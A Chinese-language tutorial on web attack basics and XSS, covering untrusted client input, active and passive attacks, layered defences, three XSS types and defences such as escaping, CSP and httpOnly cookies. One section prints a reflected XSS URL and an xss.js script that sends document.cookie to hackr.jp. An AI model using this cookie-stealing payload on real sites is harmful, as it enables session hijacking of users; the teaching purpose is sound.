# Web 攻击基础与 XSS

## 为什么服务器不能相信客户端提交的数据?

- 不可信的客户端: 客户端可以自由变更和篡改 HTTP 请求，请求里的每个参数在到达服务器之前都可能被改写;
- 服务器的立场: 服务器把一切来自客户端的请求都视为不可信的请求，只把它当作待验证的输入，而不是已经合规的数据;
- 代价: 只要某个参数没在服务器侧被检查就进入 SQL、系统命令或页面输出，攻击者就能借它改变程序的行为;

## 攻击者从哪里进来?

- 主动攻击: 攻击者主动访问 Web 应用，传入攻击代码，不需要任何用户参与;
- 主动攻击的例子: SQL 注入与 OS 命令注入，都是把恶意内容伪装成普通输入送进服务器;
- 被动攻击: 攻击者预先设置陷阱代码，诱导用户触发，用户本人成为攻击目标的跳板;
- 被动攻击的例子: XSS 与 CSRF，攻击者不直接碰目标服务器，而是借用户的浏览器与身份动手;
- 区别: 主动攻击用的是攻击者自己的请求，被动攻击用的是受害者的请求，因此被动攻击更难从服务器日志里识别;

## 防御应该分成几层?

- 客户端验证: 只作为 UI 提示，让用户在提交前看到格式问题，本身不可信，因为客户端可以被绕过;
- 服务器输入值验证: 在服务器侧验证请求参数是否合规，不合规的请求直接拒绝;
- 服务器输入值转义: 把请求参数中的特殊字符转义，使其即使被拼进 SQL、命令或 HTML 也只是一段普通文本，无法变成攻击代码;
- 浏览器和服务器的各种安全策略: 由浏览器与服务器共同提供的策略层，用来兜住前两层漏掉的攻击;
- 分层的意义: 客户端验证只改善体验，服务器验证与转义决定安全，策略层是补充;

## XSS 是什么，它想拿到什么?

- 跨站攻击脚本（XSS）: 一种被动攻击，攻击者预先设置陷阱代码并诱导用户访问，通过让浏览器运行非法的 HTML 或 JS 完成攻击;
- 攻击目的: 盗取用户信息，最典型的目标是用户的 cookie;
- 为什么在浏览器里执行: 脚本是在受害者的浏览器里以受害者的身份运行的，服务器看到的是一个合法用户的合法请求;

## 一段 XSS 攻击是怎么运作的?

```bash
# URL 非法导入 js 脚本
# 用户一旦点击该 URL, 发送自身 cookie 至指定网站
http://example.jp/login?ID="><script src=http://hackr.jp/xss.js></script>"

# xss.js
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

- 陷阱部分: URL 里的 `ID` 参数带上了闭合标签与 `<script>`，服务器若原样拼进 HTML，浏览器就把这段当成页面结构解析并执行;
- 外链部分: `<script src=...>` 让浏览器去 `hackr.jp` 下载并运行 `xss.js`，攻击代码本身不在目标站点上，也不在 URL 里;
- 窃取部分: `document.cookie` 读出当前站点的 cookie，经 `escape` 转义后用 `document.write` 拼成一张指向 `hackr.jp` 的图片地址，浏览器加载这张图片时就把 cookie 作为查询串发给了攻击者;
- 关键条件: 攻击者自己不需要登录，只要受害者点开这个链接，攻击代码就在受害者浏览器里跑起来;

## 三种 XSS 分别在哪一步执行攻击代码?

| 类型   | 攻击代码存放位置  | 执行路径                                                                                                                    |
| ------ | ----------------- | --------------------------------------------------------------------------------------------------------------------------- |
| 存储型 | 目标网站服务器    | 攻击者把攻击代码提交到目标网站服务器; 用户访问目标网站时服务器把攻击代码拼进 HTML 返回; 用户解析 HTML 并执行其中的攻击代码; |
| 反射型 | 服务器返回的 HTML | 攻击者构造特殊 URL; 用户访问该 URL 时服务器从 URL 中提取攻击代码并拼进 HTML; 用户解析 HTML 并执行其中的攻击代码;            |
| DOM 型 | 用户浏览器的 DOM  | 攻击者构造特殊 URL; 用户访问该 URL 时浏览器自行解析 URL 并执行其中的攻击代码;                                               |

- 存储型与反射型的共同点: 攻击代码都要经过服务器，由服务器把它拼进返回的 HTML;
- DOM 型的关键差别: 服务器不参与拼接，攻击代码由浏览器自己从 URL 里取出并执行，因此服务器端过滤拦不到它;

## 怎么防止 XSS?

- 用户输入输出转义和验证: 输入时验证合规，输出时转义，让攻击代码落到页面上也只是一段文本;
- CSP: 内容安全策略（CSP），设置可信内容，减少 XSS 风险;
- cookie httpOnly 字段: 给 cookie 加上 `httpOnly`，脚本读不到它，即使 XSS 执行成功也拿不走 cookie;
